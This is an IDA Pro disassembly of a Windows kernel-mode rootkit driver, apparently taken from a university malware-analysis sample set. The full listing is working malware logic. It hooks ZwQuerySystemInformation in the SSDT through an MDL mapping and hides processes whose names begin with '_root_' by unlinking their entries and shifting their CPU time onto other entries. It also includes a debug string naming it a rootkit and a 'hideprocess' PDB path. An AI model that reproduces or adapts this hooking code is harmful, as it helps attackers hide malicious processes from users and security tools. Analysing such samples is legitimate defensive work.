;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	1AC4BDD5B2BE8F334789CAF9CEB780D1
; Input	CRC32 :	05CF44EF


		include	uni.inc	; see unicode subdir of	ida for	info on	unicode

		.686p
		.mmx
		.model flat

; ===========================================================================

; [00000480 BYTES: COLLAPSED SEGMENT HEADER. PRESS KEYPAD "+" TO EXPAND]
; File Name   :	c:\Users\farhadi\Desktop\Sample\samples\1ac4bdd5b2be8f334789caf9ceb780d1
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	10000
; Section 1. (virtual address 00000480)
; Virtual size			: 00000240 (	576.)
; Section size in file		: 00000280 (	640.)
; Offset to raw	data for section: 00000480
; Flags	68000020: Text Not pageable Executable Readable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 10480h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
		dd 0
		db 2 dup(0)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10486	proc near		; DATA XREF: DriverEntry+8Ao

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	[ebp+arg_C]
		mov	esi, [ebp+arg_4]
		push	[ebp+arg_8]
		push	esi
		push	[ebp+arg_0]
		call	dword_10818
		xor	ecx, ecx
		cmp	eax, ecx
		mov	[ebp+arg_C], eax
		jl	loc_1058D
		cmp	[ebp+arg_0], 5
		jnz	loc_1056B
		xor	ebx, ebx
		mov	edx, esi
		cmp	esi, ecx
		jz	loc_1058D
		push	edi

loc_104C4:				; CODE XREF: sub_10486+DCj
		mov	esi, [edx+3Ch]
		cmp	esi, ecx
		jz	short loc_1051A
		push	0Ch
		pop	ecx
		mov	edi, offset a_root_ ; "_root_"
		xor	eax, eax
		repe cmpsb
		jz	short loc_104DE
		sbb	eax, eax
		sbb	eax, 0FFFFFFFFh

loc_104DE:				; CODE XREF: sub_10486+51j
		xor	ecx, ecx
		cmp	eax, ecx
		jnz	short loc_10552
		mov	eax, [edx+28h]
		add	dword_10810, eax
		mov	eax, [edx+2Ch]
		adc	dword_10814, eax
		mov	eax, [edx+30h]
		add	dword_10800, eax
		mov	eax, [edx+34h]
		adc	dword_10804, eax
		cmp	ebx, ecx
		jz	short loc_10552
		mov	eax, [edx]
		cmp	eax, ecx
		jz	short loc_10516
		add	[ebx], eax
		jmp	short loc_10552
; ---------------------------------------------------------------------------

loc_10516:				; CODE XREF: sub_10486+8Aj
		mov	[ebx], ecx
		jmp	short loc_10552
; ---------------------------------------------------------------------------

loc_1051A:				; CODE XREF: sub_10486+43j
		mov	eax, dword_10810
		add	[edx+28h], eax
		mov	eax, dword_10814
		adc	[edx+2Ch], eax
		mov	eax, dword_10800
		add	[edx+30h], eax
		mov	eax, dword_10804
		adc	[edx+34h], eax
		mov	dword_10800, ecx
		mov	dword_10804, ecx
		mov	dword_10810, ecx
		mov	dword_10814, ecx

loc_10552:				; CODE XREF: sub_10486+5Cj
					; sub_10486+84j ...
		mov	eax, [edx]
		mov	ebx, edx
		cmp	eax, ecx
		jz	short loc_1055E
		add	edx, eax
		jmp	short loc_10560
; ---------------------------------------------------------------------------

loc_1055E:				; CODE XREF: sub_10486+D2j
		xor	edx, edx

loc_10560:				; CODE XREF: sub_10486+D6j
		cmp	edx, ecx
		jnz	loc_104C4
		pop	edi
		jmp	short loc_1058D
; ---------------------------------------------------------------------------

loc_1056B:				; CODE XREF: sub_10486+2Bj
		cmp	[ebp+arg_0], 8
		jnz	short loc_1058D
		mov	eax, dword_10800
		add	eax, dword_10810
		mov	ecx, dword_10804
		adc	ecx, dword_10814
		add	[esi], eax
		adc	[esi+4], ecx

loc_1058D:				; CODE XREF: sub_10486+21j
					; sub_10486+37j ...
		mov	eax, [ebp+arg_C]
		pop	esi
		pop	ebx
		pop	ebp
		retn	10h
sub_10486	endp

; ---------------------------------------------------------------------------
		db 6 dup(0CCh)
; ---------------------------------------------------------------------------

loc_1059C:				; DATA XREF: DriverEntry+8o
		push	offset aRootkitOnunloa ; "ROOTKIT: OnUnload called\n"
		call	DbgPrint
		mov	edx, dword_1081C
		mov	eax, dword_10818
		pop	ecx
		mov	ecx, ds:ZwQuerySystemInformation
		mov	ecx, [ecx+1]
		lea	ecx, [edx+ecx*4]
		xchg	eax, [ecx]
		mov	eax, MemoryDescriptorList
		test	eax, eax
		jz	short locret_105E2
		push	eax
		push	dword_1081C
		call	ds:MmUnmapLockedPages
		push	MemoryDescriptorList
		call	ds:IoFreeMdl

locret_105E2:				; CODE XREF: .text:000105C7j
		retn	4
; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; NTSTATUS __stdcall DriverEntry(PDRIVER_OBJECT	DriverObject, PUNICODE_STRING RegistryPath)
		public DriverEntry
DriverEntry	proc near

DriverObject	= dword	ptr  8
RegistryPath	= dword	ptr  0Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+DriverObject]
		mov	dword ptr [eax+34h], offset loc_1059C
		mov	eax, ds:KeServiceDescriptorTable
		push	esi
		mov	esi, ds:ZwQuerySystemInformation
		push	edi
		xor	edi, edi
		mov	dword_10800, edi
		mov	dword_10804, edi
		mov	dword_10810, edi
		mov	dword_10814, edi
		mov	ecx, [esi+1]
		mov	edx, [eax]
		mov	ecx, [edx+ecx*4]
		mov	dword_10818, ecx
		mov	ecx, [eax+8]
		shl	ecx, 2
		push	ecx		; Length
		push	dword ptr [eax]	; Base
		push	edi		; MemoryDescriptorList
		call	ds:MmCreateMdl
		mov	MemoryDescriptorList, eax
		cmp	eax, edi
		jnz	short loc_1064E
		mov	eax, 0C0000001h
		jmp	short loc_10686
; ---------------------------------------------------------------------------

loc_1064E:				; CODE XREF: DriverEntry+5Bj
		push	eax		; MemoryDescriptorList
		call	ds:MmBuildMdlForNonPagedPool
		mov	eax, MemoryDescriptorList
		or	word ptr [eax+6], 1
		push	edi		; AccessMode
		push	MemoryDescriptorList ; MemoryDescriptorList
		call	ds:MmMapLockedPages
		mov	dword_1081C, eax
		mov	edx, [esi+1]
		mov	ecx, offset sub_10486
		lea	eax, [eax+edx*4]
		xchg	ecx, [eax]
		mov	dword_10818, ecx
		xor	eax, eax

loc_10686:				; CODE XREF: DriverEntry+62j
		pop	edi
		pop	esi
		pop	ebp
		retn	8
DriverEntry	endp

; ---------------------------------------------------------------------------
		db 6 dup(0CCh)
; [00000006 BYTES: COLLAPSED FUNCTION DbgPrint.	PRESS KEYPAD "+" TO EXPAND]
a_root_:				; DATA XREF: sub_10486+48o
		unicode	0, <_root_>,0
aRootkitOnunloa	db 'ROOTKIT: OnUnload called',0Ah,0 ; DATA XREF: .text:loc_1059Co
		align 80h
_text		ends

; Section 2. (virtual address 00000700)
; Virtual size			: 0000009C (	156.)
; Section size in file		: 00000100 (	256.)
; Offset to raw	data for section: 00000700
; Flags	48000040: Data Not pageable Readable
; Alignment	: default
;
; Imports from ntoskrnl.exe
;
; ===========================================================================

; Segment type:	Externs
; _idata
; void __stdcall IoFreeMdl(PMDL	Mdl)
		extrn IoFreeMdl:dword	; CODE XREF: .text:000105DCp
					; DATA XREF: .text:000105DCr ...
; void __stdcall MmUnmapLockedPages(PVOID BaseAddress, PMDL MemoryDescriptorList)
		extrn MmUnmapLockedPages:dword ; CODE XREF: .text:000105D0p
					; DATA XREF: .text:000105D0r
; NTSTATUS __stdcall ZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation,	ULONG SystemInformationLength, PULONG ReturnLength)
		extrn ZwQuerySystemInformation:dword ; DATA XREF: .text:000105B2r
					; DriverEntry+15r
; ULONG	DbgPrint(PCH Format, ...)
		extrn __imp_DbgPrint:dword ; DATA XREF:	DbgPrintr
; PVOID	__stdcall MmMapLockedPages(PMDL	MemoryDescriptorList, KPROCESSOR_MODE AccessMode)
		extrn MmMapLockedPages:dword ; CODE XREF: DriverEntry+7Cp
					; DATA XREF: DriverEntry+7Cr
; void __stdcall MmBuildMdlForNonPagedPool(PMDL	MemoryDescriptorList)
		extrn MmBuildMdlForNonPagedPool:dword ;	CODE XREF: DriverEntry+65p
					; DATA XREF: DriverEntry+65r
; PMDL __stdcall MmCreateMdl(PMDL MemoryDescriptorList,	PVOID Base, SIZE_T Length)
		extrn MmCreateMdl:dword	; CODE XREF: DriverEntry+4Ep
					; DATA XREF: DriverEntry+4Er
		extrn KeServiceDescriptorTable:dword ; DATA XREF: DriverEntry+Fr


; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 10724h
		dd 4 dup(0)
aSO		db 'È–ÀO',0
		align 4
		dd 2, 50h, 2 dup(74Ch),	53445352h, 0B1D6A438h, 44658116h
		dd 0F6CA95A4h, 0B1928B48h, 1
aZProjSrcHidepr	db 'z:\proj\src\hideprocesshookmdl\sys\i386\hideprocess.pdb',0
		align 80h
_rdata		ends

; Section 3. (virtual address 00000800)
; Virtual size			: 00000020 (	 32.)
; Section size in file		: 00000080 (	128.)
; Offset to raw	data for section: 00000800
; Flags	C8000040: Data Not pageable Readable Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 10800h
dword_10800	dd 0			; DATA XREF: sub_10486+73w
					; sub_10486+A4r ...
dword_10804	dd 0			; DATA XREF: sub_10486+7Cw
					; sub_10486+ACr ...
; PMDL MemoryDescriptorList
MemoryDescriptorList dd	0		; DATA XREF: .text:000105C0r
					; .text:000105D6r ...
		align 10h
dword_10810	dd 0			; DATA XREF: sub_10486+61w
					; sub_10486:loc_1051Ar	...
dword_10814	dd 0			; DATA XREF: sub_10486+6Aw
					; sub_10486+9Cr ...
dword_10818	dd 0			; DATA XREF: sub_10486+14r
					; .text:000105ACr ...
dword_1081C	dd 0			; DATA XREF: .text:000105A6r
					; .text:000105CAr ...
		align 80h
_data		ends

; Section 4. (virtual address 00000880)
; Virtual size			: 000000FE (	254.)
; Section size in file		: 00000100 (	256.)
; Offset to raw	data for section: 00000880
; Flags	E2000020: Text Discardable Executable Readable Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Write/Execute
INIT		segment	para public 'CODE' use32
		assume cs:INIT
		;org 10880h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
__IMPORT_DESCRIPTOR_ntoskrnl_exe dd rva	off_108A8 ; Import Name	Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aNtoskrnl_exe	; DLL Name
		dd rva IoFreeMdl	; Import Address Table
		dd 5 dup(0)
;
; Import names for ntoskrnl.exe
;
off_108A8	dd rva word_108CC	; DATA XREF: INIT:__IMPORT_DESCRIPTOR_ntoskrnl_exeo
		dd rva word_108D8
		dd rva word_108EE
		dd rva word_1090A
		dd rva word_10916
		dd rva word_1092A
		dd rva word_10946
		dd rva word_10954
		dd 0
word_108CC	dw 162h			; DATA XREF: INIT:off_108A8o
		db 'IoFreeMdl',0
word_108D8	dw 2CDh			; DATA XREF: INIT:000108ACo
		db 'MmUnmapLockedPages',0
		align 2
word_108EE	dw 550h			; DATA XREF: INIT:000108B0o
		db 'ZwQuerySystemInformation',0
		align 2
word_1090A	dw 30h			; DATA XREF: INIT:000108B4o
		db 'DbgPrint',0
		align 2
word_10916	dw 2AFh			; DATA XREF: INIT:000108B8o
		db 'MmMapLockedPages',0
		align 2
word_1092A	dw 292h			; DATA XREF: INIT:000108BCo
		db 'MmBuildMdlForNonPagedPool',0
word_10946	dw 295h			; DATA XREF: INIT:000108C0o
		db 'MmCreateMdl',0
word_10954	dw 252h			; DATA XREF: INIT:000108C4o
		db 'KeServiceDescriptorTable',0
		align 10h
aNtoskrnl_exe	db 'ntoskrnl.exe',0     ; DATA XREF: INIT:0001088Co
		align 10h
INIT		ends

; ===========================================================================

; [00000080 BYTES: COLLAPSED SEGMENT _reloc. PRESS KEYPAD "+" TO EXPAND]
